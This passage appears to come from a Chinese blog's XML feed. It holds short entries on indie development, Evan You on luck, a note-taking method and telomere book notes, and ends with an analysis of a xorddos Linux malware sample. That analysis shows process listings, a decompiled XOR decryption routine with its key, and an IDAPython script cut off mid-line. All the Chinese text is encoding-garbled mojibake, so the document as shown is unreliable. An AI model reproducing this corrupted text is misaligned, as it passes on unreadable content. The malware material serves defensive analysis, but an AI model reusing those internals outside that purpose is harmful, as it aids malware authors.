æ¬¡</li></ul><p>çŠ¶æ€ç®¡ç†</p><ul><li>æœ‰å¤šå°‘çŠ¶æ€åšå¤šå°‘äº‹ï¼Œå³ä½¿çŠ¶æ€ä¸å¤ªå¥½ï¼Œä¹Ÿéœ€è¦åšäº‹ã€‚</li><li>å¤–éƒ¨ç¯å¢ƒå¯¹çŠ¶æ€æœ‰å½±å“ï¼Œå¯ä»¥åˆ©ç”¨å›¾ä¹¦é¦†ç­‰åœºæ‰€ï¼Œå°†è‡ªå·±å¸¦å…¥çŠ¶æ€ã€‚</li></ul><p>æ—¶é—´ç®¡ç†ï¼ˆè‡ªå¾‹ï¼‰</p><ul><li>æ›¾ç»ç»å†å·¥ä½œæ··ä¹±çš„æ—¶æœŸï¼Œç°åœ¨ä¸¥æ ¼å·¥ä½œæ—¶é—´ç™»è®°ï¼Œè‡ªå·±å¼€å‘ç³»ç»Ÿå®Œæˆå·¥ä½œæ—¶é—´ç™»è®°ã€‚</li><li>è‡ªå¾‹è¿˜åŒ…æ‹¬å®šæœŸ Review (æ—¥æŠ¥ã€å‘¨æŠ¥)ï¼Œè®¡åˆ’ç®¡ç†ï¼Œä¿æŒè‡ªå·±çš„å¼€å‘èŠ‚å¥ã€‚</li><li>å·¥ä½œæ—¥åŸºæœ¬éƒ½å·¥ä½œå’Œä¸Šç­æ— å·®å¼‚ï¼Œé™¤éé‡ä¸Šç´§æ€¥çš„äº‹ã€‚</li></ul><p>å¥½å¥‡å¿ƒ</p><ul><li>å–œæ¬¢æ–°æŠ€æœ¯ï¼Œå–œæ¬¢æ–°äº§å“ï¼Œå–œæ¬¢æŠ˜è…¾ (ubuntu Tweak)</li></ul><p>æ•æ„Ÿåº¦</p><ul><li>ç‹¬ç«‹å¼€å‘è€…ï¼Œéœ€è¦é€šè¿‡ç¤¾äº¤åª’ä½“ã€é‚®ä»¶åˆ—è¡¨ã€newsletter è¿æ¥å¤–éƒ¨ä¸–ç•Œï¼Œä¿æŒå¯¹æ–°äº‹ç‰©çš„æ•æ„Ÿåº¦</li></ul><p>å¬å®Œ podcastï¼Œæˆ‘å‘ç°å›¾æ‹‰é¼éå¸¸å¼ºè°ƒå·¥ä½œå’Œå…´è¶£çš„åŒ¹é…åº¦ï¼Œè¿™å¯èƒ½å°±æ˜¯ä»–èƒ½é•¿æœŸç»´æŠ¤äº§å“çš„ä¸€ä¸ªé‡è¦åŸå› ã€‚</p><p>reference: <a href="https://pca.st/5v33uy2z">https://pca.st/5v33uy2z</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å°¤é›¨æºªè°ˆæˆåŠŸå’Œè¿æ°”</title>
    <link href="/cn/youyuxi/"/>
    <url>/cn/youyuxi/</url>
    
    <content type="html"><![CDATA[<p>1ï¼‰è¿æ°”å¾ˆé‡è¦ï¼Œæ—¶åŠ¿é€ è‹±é›„<br>åœ¨é€‚å½“çš„æ—¶é—´èŠ‚ç‚¹ä¸Šæ¨å‡ºåˆé€‚çš„äº§å“èƒ½å¤§å¹…æé«˜æˆåŠŸçš„æ¦‚ç‡<br>2ï¼‰çœŸæ­£çš„å…³é”®ç‚¹ï¼Œä¸åœ¨å†™ç¨‹åºä¸Š<br>é‡è¦çš„æ˜¯åˆ¤æ–­éœ€æ±‚ï¼Œåˆ¶å®šåˆé€‚çš„æŠ€æœ¯æ–¹æ¡ˆå»æ»¡è¶³å®¢æˆ·çš„éœ€æ±‚<br>3ï¼‰æˆåŠŸéœ€è¦å¸‚åœºç›´è§‰å’Œäº§å“ä¸Šçš„åˆ¤æ–­åŠ›<br>4ï¼‰å…‰æœ‰èƒ½åŠ›æˆ–è€…å…‰æœ‰è¿æ°”éƒ½å¾ˆéš¾æˆåŠŸ<br>è¿æ°”æ˜¯å®¢è§‚å­˜åœ¨çš„ï¼ŒBut thereâ€™s nothing we can do about it.<br>5ï¼‰æˆ‘ä»¬åªèƒ½æé«˜è‡ªå·±èƒ½åŠ›ï¼Œå¤šå°è¯•ï¼Œæ¯æ¬¡å°è¯•è¿æ°”éƒ½ä¸ä¸€æ ·<br>6ï¼‰ç‹¬ç«‹å¼€å‘é‡è¦çš„ä¸æ˜¯æŠ€æœ¯çš„ä¼˜åŠ£ï¼Œè€Œæ˜¯å¦‚ä½•å¼€å‘ä¸€ä¸ªäº§å“çš„é—®é¢˜</p><ul><li>å¦‚ä½•å¿«é€ŸåŒ¹é…å¸‚åœºéœ€æ±‚</li><li>å¦‚ä½•è¯†åˆ«ç›®æ ‡å®¢æˆ·</li><li>å¦‚ä½•å¿«é€ŸéªŒè¯å•†ä¸šæ¨¡å¼</li><li>å¦‚ä½•å¿«é€Ÿæ¨å‘å¸‚åœºã€‚</li><li>è€ƒéªŒçš„æ˜¯è¿è¥èƒ½åŠ›ã€åˆç†åˆ†é…èµ„æºçš„èƒ½åŠ›ï¼Œç®€åŒ–åˆ›ä¸šæµç¨‹çš„èƒ½åŠ›</li></ul><p>reference: <a href="https://pca.st/yjf05b7i">https://pca.st/yjf05b7i</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸‡ç»´é’¢çš„å¼ºåŠ›ç ”è¯»ç¬”è®°æ³•</title>
    <link href="/cn/qiangliyandu/"/>
    <url>/cn/qiangliyandu/</url>
    
    <content type="html"><![CDATA[<p>æ¸…æ™°è¡¨è¾¾æ¯ä¸€ç« çš„é€»è¾‘è„‰ç»œ</p><ul><li>æŒ‰ç…§ä¹¦ç±çš„ç« èŠ‚ç»™ç¬”è®°åˆ’åˆ†ç« èŠ‚ï¼Œç”¨è‡ªå·±çš„è¯å†™å‡ºæ¯ä¸€ä¸ªç« èŠ‚çš„å†…å®¹ï¼Œå„ç« å†…å®¹ä¸²è”èµ·æ¥å°±æˆäº†æ•´æœ¬ä¹¦çš„å†…å®¹æè¦</li><li>æœ€é‡è¦çš„æ˜¯ç†æ¸…ä½œè€…çš„é€»è¾‘è„‰ç»œï¼Œæ¯ä¸€ç« çš„é€»è¾‘ç»“æ„å¯èƒ½å°±å‡ å¥è¯ï¼Œå´å¯èƒ½åˆ†æ•£åœ¨å¤§å‡ åé¡µçš„å†…å®¹ä¸­</li></ul><p>å¸¦èµ°ä¹¦ä¸­çš„æ‰€æœ‰äº®ç‚¹</p><ul><li>è¯»ä¹¦ä¸æ˜¯åˆ’çº¿å¼çš„é‡ç‚¹å†…å®¹æ€»ç»“ï¼Œè€Œåº”è¯¥æ³¨æ„è®©ä½ æ‹æ¡ˆå«ç»ï¼Œç‚¹é†’æ¢¦ä¸­äººï¼Œè¿™äº›å¯ä»¥åˆºæ¿€æ”¹å˜ä½ çš„æ€ç»´çš„å†…å®¹</li></ul><p>å¤§é‡è‡ªå·±çš„çœ‹æ³•å’Œå¿ƒå¾—</p><ul><li>å¼ºåŠ›ç ”è¯»æ˜¯ä¸»åŠ¨å¼çš„è¯»ä¹¦ï¼Œä½ éœ€è¦å†™ä¸‹è‡ªå·±å¯¹ä¸€æ®µå†…å®¹æˆ–ä¸€å¥è¯çš„ç†è§£</li><li>ä½ å¯ä»¥è´¨ç–‘æˆ–è€…è‚¯å®šä½œè€…çš„çœ‹æ³•ï¼Œä¹Ÿå¯ä»¥å†™ä¸‹è‡ªå·±é˜…è¯»æ—¶çš„çµæ„Ÿ</li><li>åœ¨å†™è¯»ä¹¦ç¬”è®°çš„è¿‡ç¨‹ä¸­ï¼Œä½ å¯èƒ½çªç„¶è§£å†³äº†ä¸€ä¸ªä½ ä»¥å‰å…³æ³¨çš„é—®é¢˜ï¼Œä¹Ÿå¯èƒ½æƒ³åˆ°äº†ä¹¦ä¸­æ€æƒ³ä¸€ä¸ªåº”ç”¨åœºæ™¯</li><li>è¿™äº›çµæ„Ÿéƒ½ç›¸å½“å®è´µï¼Œè½¬ç¬å³é€ï¼Œä¸€å®šè¦å°†æŠŠä»–ä»¬è®°å½•ä¸‹æ¥</li></ul><p>å‘ç°æœ¬ä¹¦å’Œå…¶ä»–ä¹¦ç±æ–‡ç« çš„è”ç³»</p><ul><li>æå°‘ä¹¦çš„æ€æƒ³æ˜¯ç‹¬ç«‹ä¸ä¸–ç•Œçš„ï¼Œå¤§å¤šæ–°çŸ¥è¯†éƒ½æ˜¯å»ºç«‹åœ¨æ—§çŸ¥è¯†çš„åŸºç¡€ä¸Šçš„</li><li>åŒä¸€é—®é¢˜ï¼Œä¸åŒä¹¦ç±çš„ä½œè€…çš„çœ‹æ³•æœ‰ä»€ä¹ˆä¸åŒä¹‹å¤„ï¼Œæœ‰æ²¡æœ‰æ–°çš„è®ºæ®æ”¯æŒæˆ–è€…åå¯¹ä»–ä»¬çš„çœ‹æ³•</li></ul><p>å¥½ä¹¦éœ€è¦è‡³å°‘é˜…è¯»ä¸¤é</p><ul><li>ç¬¬ä¸€éæ˜¯ä¸ºäº†é™·è¿›å»ï¼Œç¬¬äºŒéæ˜¯ä¸ºäº†è·³å‡ºæ¥</li><li>ç¬¬ä¸€éé˜…è¯»å¯èƒ½å¯¹é¢†åŸŸå†…å®¹ä¸å¤ªç†Ÿæ‚‰ï¼Œå…¨éƒ¨å¸¦å®½éƒ½è¦ç”¨äºç†è§£ä½œè€…çš„æ€æƒ³ã€‚</li><li>æƒ³æ³•åªæœ‰åœ¨å¸¦å®½å‰©ä½™æ—¶ï¼Œæ‰å¯èƒ½å†’å‡ºæ¥ã€‚ä¸ºäº†æœ€æœ‰ä»·å€¼çš„å¿ƒå¾—ã€çµæ„Ÿå’Œè”ç³»ï¼Œå¯¹å¥½ä¹¦æˆ‘ä»¬è‡³å°‘é˜…è¯»ä¸¤é</li><li>ç¬”è®°æ˜¯å¯¹å¥½ä¹¦æœ€å¥½çš„æ•¬æ„ï¼Œç¬”è®°ä¸æ˜¯ä¹¦è¯„ï¼Œå®ƒæ˜¯ä¸ªäººçŸ¥è¯†çš„å»¶ä¼¸</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç«¯ç²’æ•ˆåº”</title>
    <link href="/cn/living_younger_healthier_logger/"/>
    <url>/cn/living_younger_healthier_logger/</url>
    
    <content type="html"><![CDATA[<p>è·å¾— 2009 å¹´è¯ºè´å°”ç”Ÿç†æˆ–åŒ»å­¦å¥–çš„ ä¼Šä¸½èç™½Â·å¸ƒè±å…‹æœ¬åœ¨ ã€Šç«¯ç²’æ•ˆåº”ã€‹ä¸€ä¹¦ä¸­è¯´æ˜ï¼šäººåªæ‰€ä»¥å˜è€ï¼Œæ˜¯ç”±äºæŸäº›ç»†èƒä¸å†æ›´æ–°äº†ï¼Œè€Œç»†èƒåˆ†è£‚æ›´æ–°çš„é™åˆ¶åœ¨äº â€œç«¯ç²’â€ã€‚</p><p>ç«¯ç²’æ˜¯æŸ“è‰²ä½“æœ«ç«¯çš„ DNA åºåˆ—ï¼Œåœ¨ç»†èƒåˆ†è£‚è¿‡ç¨‹ä¸­ï¼Œç«¯ç²’èµ·åˆ°ä¿æŠ¤ DNA åºåˆ—çš„ä½œç”¨ã€‚æ‰€ä»¥ï¼Œäººä¹‹æ‰€å˜è€çš„æœ¬è´¨åŸå› æ˜¯ ã€Œç«¯ç²’å˜çŸ­ã€ã€‚</p><p>å½±å“ç«¯ç²’å˜çŸ­çš„å› ç´ </p><ul><li>æ€æƒ³å‹åŠ›ï¼šç ”ç©¶è¡¨æ˜é•¿æœŸç…§é¡¾æ‚£ç—…å°å­©çš„æ¯äº²ï¼Œç«¯ç²’é•¿åº¦è¾ƒæ­£å¸¸äººå˜çŸ­</li><li>æ•Œæ„ï¼šçœ‹å“ªå„¿éƒ½ä¸å¯¹ï¼Œå’Œå‘¨å›´çš„äººå…³ç³»æå·®</li><li>æ‚²è§‚ï¼šå¯¹äº‹æƒ…æ€»æœ‰ä¸€ä¸ªè´Ÿé¢çš„é¢„æœŸ</li><li>èƒ¡æ€ä¹±æƒ³ï¼šæŠ‘éƒï¼Œéƒ½æ˜¯ä¹±æƒ³è´Ÿé¢çš„ä¸œè¥¿ï¼Œè§‰å¾—ä¸å…¬å¹³å¯¹å¾…</li></ul><p>ç¼“è§£è´Ÿé¢æƒ…ç»ªçš„æ–¹æ³•</p><ul><li>æŠŠå‹åŠ›è§†ä¸ºæŒ‘æˆ˜ï¼šå¯¹å‹åŠ›çš„ååº”æ˜¯å¨èƒè¿˜æ˜¯æŒ‘æˆ˜ï¼Œå†³å®šå‹åŠ›çš„æ€§è´¨</li><li>ä¸“æ³¨åŠ›è®­ç»ƒï¼šå†¥æƒ³</li><li>æ‰¾åˆ°äººç”Ÿçš„ç›®æ ‡ï¼šfind something bigger than yourself</li></ul><p>é”»ç‚¼å¯¹ç«¯ç²’çš„å¥½å¤„</p><ul><li>äººä½“æ˜¯åè„†å¼±ç³»ç»Ÿï¼šé”»ç‚¼çš„æœ¬è´¨æ˜¯å¯¹èº«ä½“çš„é€‚åº¦æ‰“å‡»</li><li>ç»†èƒçš„åå‡»ï¼šé€‚åº¦çš„é”»ç‚¼èƒ½ä½¿ç«¯ç²’å˜é•¿ï¼Œå¹¶å¢åŠ ã€Œè‡ªç”±åŸºã€</li><li>æŠ—æ°§åŒ–å‰‚å¢å¤šï¼šçªç„¶å¢å¤šçš„è‡ªç”±åŸºä½¿å¾—èº«ä½“å¢åŠ æŠ—æ°§åŒ–å‰‚ï¼Œé”»ç‚¼æ”¹å˜äº†è‡ªç”±åŸºå’ŒæŠ—æ°§åŒ–å‰‚çš„å¹³è¡¡</li><li>é”»ç‚¼åˆ°åº•æ˜¯å½±å“ç«¯ç²’è¿˜æ˜¯ç«¯ç²’è„¢ï¼Œåˆ†å­ç”Ÿç‰©å­¦ä¸Šçš„æœºåˆ¶ç§‘å­¦å®¶ç°åœ¨è¿˜ä¸çŸ¥é“</li></ul><p>ä¸¤ç§ç§‘å­¦çš„é”»ç‚¼æ–¹æ³•</p><ul><li>æœ‰æ°§è€åŠ›è®­ç»ƒï¼šé•¿è·‘ï¼Œæ¯æ¬¡è·‘å››åäº”åˆ†é’Ÿï¼Œæ¯å‘¨è·‘ä¸‰æ¬¡ï¼ŒåšæŒå…­ä¸ªæœˆï¼Œä½ çš„ç«¯ç²’é…¶çš„æ´»æ€§å°±èƒ½æé«˜ä¸¤å€</li><li>é«˜å¼ºåº¦çš„é—´æ­‡è®­ç»ƒï¼šçŸ­è·‘ç»“åˆæ¢å¤çš„åŠæ³•ï¼Œå¿«è·‘å‡ åˆ†é’Ÿï¼Œåœä¸‹æ¥æ…¢èµ°ä¼‘æ¯ï¼Œç„¶åå†å¿«è·‘</li></ul><p>èŠ‚é£Ÿå’Œå‡è‚¥çš„è§‚å¿µ</p><ul><li>ä½“é‡å¯èƒ½å¹¶ä¸æ˜¯è‚¥èƒ–çš„æœ€å¥½æŒ‡æ ‡ï¼Œæ›´å¥½çš„æŒ‡æ ‡æ˜¯ ã€Œè…°è‡€æ¯”ã€</li><li>è‚šå­å¤§ä»£è¡¨æ–°é™ˆä»£è°¢æ°´å¹³ä½ï¼Œä¼šè®©ç«¯ç²’å˜çŸ­</li><li>è‚šå­å¤§ï¼Œè…°è‡€æ¯”è¿‡é«˜ï¼Œèƒ†å›ºé†‡è¶…æ ‡ï¼›é«˜è¡€å‹ï¼›èƒ°å²›ç´ æŠµæŠ—ï¼Œå…·å¤‡ä¸‰ä¸ªå°±æ˜¯æ–°é™ˆä»£è°¢ç»¼åˆç—‡</li><li>é¥¥é¥¿èŠ‚é£Ÿå‡è‚¥ä¸å¯å–ï¼Œå°±ç®—å‡ä¸‹ä½“é‡ä¹Ÿå¾ˆå®¹æ˜“æŠ¥å¤æ€§åå¼¹</li><li>ç³–å¯èƒ½æ˜¯å„ç§å¥åº·é—®é¢˜çš„ç½ªé­ç¥¸é¦–</li></ul><p>ä»ç«¯ç²’è¯´ï¼Œç»†èƒæœ‰ä¸‰ä¸ªæ•Œäºº</p><ul><li>ç»†èƒå‘ç‚ï¼šè‚¥èƒ–ä½¿ç»†èƒå®¹æ˜“å‘ç‚ï¼Œä»è€Œä½¿ç«¯ç²’å˜çŸ­ã€‚omega-3 å¯ä»¥é˜²æ­¢ç»†èƒå‘ç‚ï¼Œé±¼ç±»ã€ç‰›å¥¶ã€æœ‰æœºé¸¡è›‹ä¸­å«æœ‰ omega-3 è„‚è‚ªé…¸</li><li>æ°§åŒ–åº”æ¿€ååº”ï¼šç»´ç”Ÿç´  C å’Œç»´ç”Ÿç´  E å¯ä»¥å¯¹æŠ—æ°§åŒ–åº”æ€¥ååº”ã€‚é¥®é£Ÿä¸­å¯ä»¥åƒäº›æ°´æœã€èƒ¡èåœã€è¥¿çº¢æŸ¿ã€åœŸè±†å’Œç»¿å¶è”¬èœ</li><li>èƒ°å²›ç´ æŠµæŠ—ï¼šå¯¹æŠ—èƒ°å²›ç´ æŠµæŠ—ï¼Œå…³é”®æ˜¯è¦å°‘åƒç³–</li></ul><p>ä»çœ‹ç«¯ç²’çš„è§’åº¦åˆ†æé¥®é£Ÿ</p><ul><li>å¯¹ç«¯ç²’æœ‰å®³çš„é£Ÿç‰©æœ‰ï¼šçº¢è‚‰ï¼ŒåŠ å·¥è‚‰ç±»ï¼ˆé¦™è‚ ï¼‰ã€ç™½é¢åŒ…ã€å«ç³–é¥®æ–™ã€omega-6 ï¼Œè¿‡é‡é¥®é…’</li><li>å¯¹ç«¯ç²’æœ‰ç›Šçš„é£Ÿç‰©æœ‰ï¼šæ¤ç‰©çº¤ç»´ã€å…¨éº¦ã€è”¬èœã€åšæœã€è±†ç±»ã€æ°´æœã€æµ·å¸¦ã€omega-3</li></ul><p>äººçš„ç¯å¢ƒå¯¹ç«¯ç²’çš„å½±å“</p><ul><li>åŸå¸‚çš„å±…æ°‘æ¯”ä¹¡æ‘å±…æ°‘æ›´å®¹æ˜“è§†å‹åŠ›ä¸ºå¨èƒï¼Œå› ä¸ºåŸå¸‚å±…æ°‘çš„â€œæä»æ ¸â€ éƒ¨ä½æ¯”è¾ƒæ´»è·ƒï¼Œè¿™ä¸ªéƒ¨ä½ä¸»è¦è´Ÿè´£ææƒ§æ„Ÿ</li><li>ç¤¾ä¼šå…³ç³»æ¯”é‡‘é’±å¯¹ç«¯ç²’çš„å½±å“æ›´å¤§ï¼Œåªè¦èƒ½æ»¡è¶³åŸºæœ¬çš„ç”Ÿæ´»éœ€æ±‚ï¼Œé‡‘é’±å¯¹ç«¯ç²’çš„å½±å“å°±ä¸å¤§</li><li>å—æ•™è‚²çš„ç¨‹åº¦å¯¹ç«¯ç²’å½±å“å¾ˆå¤§ï¼Œç ”ç©¶è¡¨æ˜å—æ•™è‚²ç¨‹åº¦è¶Šé«˜ç«¯ç²’è¶Šé•¿</li><li>èŒä¸šå¾ˆé‡è¦æ¯”æ”¶å…¥å¯¹ç«¯ç²’å½±å“å¤§ï¼Œä¸€ä¸ªä»äº‹åŸºæœ¬å·¥ä½œçš„ç™½é¢†ä¹Ÿæ¯”æ”¶å…¥æ›´é«˜çš„è“é¢†ç«¯ç²’è¦é•¿</li></ul><p>ä»ç«¯ç²’çœ‹ï¼Œçˆ¶æ¯å¯¹å­©å­çš„å½±å“</p><ul><li>é—ä¼ ï¼šç«¯ç²’é•¿åº¦å¯ä»¥ä¸é€šè¿‡åŸºå› é—ä¼ ï¼Œè€Œæ˜¯â€œç›´æ¥ä¼ é€’â€ï¼Œæ€€å­•æ—¶çˆ¶æ¯çš„ç«¯ç²’æ¯”è¾ƒçŸ­ï¼Œå­©å­å‡ºç”Ÿæ—¶ç«¯ç²’ä¹Ÿå°±æ¯”è¾ƒçŸ­</li><li>å­•æœŸå‹åŠ›ï¼šæ€€å­•æœŸé—´æ¯äº²çš„å‹åŠ›æƒ…å†µï¼Œäººé‡åˆ°å‹åŠ›ä¼šåˆ†æ³Œçš®è´¨é†‡ï¼Œä»è€Œå½±å“å­©å­çš„ç«¯ç²’</li><li>å®¶åº­ç¯å¢ƒï¼šè¶Šå°‘çˆ¶æ¯çš„å…³çˆ±ï¼Œè¢«çˆ¶æ¯å¿½è§†çš„å­©å­ï¼Œç«¯ç²’ä¼šæ¯”è¾ƒçŸ­</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xorddos æ ·æœ¬è¿›ç¨‹éšè—çš„å°ä¼ä¿©</title>
    <link href="/cn/xorddos_hide/"/>
    <url>/cn/xorddos_hide/</url>
    
    <content type="html"><![CDATA[<h2 id="è¿›ç¨‹éšè—"><a href="#è¿›ç¨‹éšè—" class="headerlink" title="è¿›ç¨‹éšè—"></a>è¿›ç¨‹éšè—</h2><p>ä¸Šå‘¨ç”±äºå·¥ä½œåŸå› æ¥è§¦åˆ°xorddosçš„æ ·æœ¬ï¼Œè¿™ä¸ªæ ·æœ¬åœ¨è¿‡å»ä¸€å¹´çš„æ—¶é—´é‡Œéå¸¸å¸¸è§ï¼Œ<br>å˜ç§ä¹Ÿå¾ˆå¤šï¼Œæ‹¿åˆ°çš„æ ·æœ¬æ¯”è¾ƒæœ‰è¶£çš„æ˜¯ ps æ— æ³•å‘ç°è¿›ç¨‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># ps -ef  | grep /usr/bin</span><br><br>...<br><br>root      4597  4594  0 00:37 ?        00:00:00 gnome-pty-helper<br>root      4598  4594  0 00:37 pts/1    00:00:00 bash<br>oracle    5359     1  0 00:41 ?        00:00:00 ora_smco_orcl<br>oracle    5378     1  0 00:41 ?        00:00:00 ora_w000_orcl<br>oracle    5586     1  0 00:42 ?        00:00:00 ora_j000_orcl<br>oracle    5588     1  0 00:42 ?        00:00:00 ora_j001_orcl<br>root      5666     1  0 00:43 ?        00:00:00 sh<br>root      5669     1  0 00:43 ?        00:00:00 <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;find&quot;</span><br>root      5672     1  0 00:43 ?        00:00:00 <span class="hljs-built_in">ls</span> -la<br>root      5675     1  0 00:43 ?        00:00:00 bash<br>root      5678     1  0 00:43 ?        00:00:00 gnome-terminal<br>root      5683     1  0 00:43 ?        00:00:00 <span class="hljs-built_in">cd</span> /etc<br>root      5686     1  0 00:43 ?        00:00:00 top<br>root      5689     1  0 00:43 ?        00:00:00 sh<br>root      5692     1  0 00:43 ?        00:00:00 gnome-terminal<br>root      5695     1  0 00:43 ?        00:00:00 ifconfig<br>root      5696  4598  0 00:43 pts/1    00:00:00 ps -ef<br></code></pre></td></tr></table></figure><p>è€Œä½¿ç”¨lsofå´å¯ä»¥æ¸…é™¤åœ°çœ‹è§æ ·æœ¬æ­£åœ¨åŠªåŠ›åœ°å¹²æ´»ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># lsof +d /usr/bin</span><br>COMMAND    PID USER  FD   TYPE DEVICE    SIZE    NODE NAME<br>hidd      1853 root txt    REG    3,1   33708 2467454 /usr/bin/hidd<br>ckucbzknt 2014 root txt    REG    3,1  610331 2459176 /usr/bin/ckucbzkntb<br>xfs       2143  xfs txt    REG    3,1  107460 2468483 /usr/bin/xfs<br>Xorg      3117 root txt    REG    3,1 1890596 2466732 /usr/bin/Xorg<br>gnome-ses 4073 root txt    REG    3,1  129356 2459482 /usr/bin/gnome-session<br>ssh-agent 4201 root txt    REG    3,1   88996 2467513 /usr/bin/ssh-agent<br>dbus-laun 4245 root txt    REG    3,1   23796 2471600 /usr/bin/dbus-launch<br>gnome-key 4255 root txt    REG    3,1   97396 2473617 /usr/bin/gnome-keyring-daemon<br>metacity  4290 root txt    REG    3,1  521080 2464500 /usr/bin/metacity<br>gnome-pan 4296 root txt    REG    3,1  540868 2465177 /usr/bin/gnome-panel<br>nautilus  4298 root txt    REG    3,1 1348932 2461620 /usr/bin/nautilus<br>gnome-vol 4310 root txt    REG    3,1   65240 2464498 /usr/bin/gnome-volume-manager<br>bt-applet 4334 root txt    REG    3,1   30452 2464773 /usr/bin/bt-applet<br>nm-applet 4352 root txt    REG    3,1  312432 2467723 /usr/bin/nm-applet<br>gnome-pow 4381 root txt    REG    3,1  195284 2459473 /usr/bin/gnome-power-manager<br>pam-panel 4383 root txt    REG    3,1   39148 2461862 /usr/bin/pam-panel-icon<br>dbus-laun 4473 root txt    REG    3,1   23796 2471600 /usr/bin/dbus-launch<br>gnome-scr 4512 root txt    REG    3,1  168628 2468487 /usr/bin/gnome-screensaver<br>gnome-ter 4594 root txt    REG    3,1  309368 2464648 /usr/bin/gnome-terminal<br>gadcgkcqn 4681 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni<br>gadcgkcqn 4684 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni<br>gadcgkcqn 4687 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni<br>gadcgkcqn 4690 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni<br>gadcgkcqn 4693 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni<br></code></pre></td></tr></table></figure><p>é˜…è¯»æ±‡ç¼–ä»£ç ï¼Œåˆ†æå…·ä½“åŸå› ï¼Œå‘ç°xorddoså°†ä¸€äº›å…³é”®ä¿¡æ¯åŠ å¯†äº†ï¼ŒF5å¤„ç†è¿‡çš„ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">encrypt_code</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// ecx@2</span><br><br>  <span class="hljs-keyword">if</span> ( a2 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      *(_BYTE *)(v2 + a1) ^= xorkeys[(((_BYTE)v2 + ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(v2 &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">28</span>)) &amp; <span class="hljs-number">0xF</span>)<br>                                   - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(v2 &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">28</span>)];<br>      ++v2;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v2 != a2 );<br>  &#125;<br>  <span class="hljs-keyword">return</span> a1;<br>&#125;<br></code></pre></td></tr></table></figure><p>xorkey ä¸º BB2FA36AAA9541F0</p><p>ç”¨idapython å†™ä¸ªå°è„šæœ¬ï¼Œç®€å•å¤„ç†ä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> idautils <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> idc <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_string</span>(<span class="hljs-params">addr</span>):<br>  out = <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> Byte(addr) != <span class="hljs-number">0</span>:<br>      out += <span 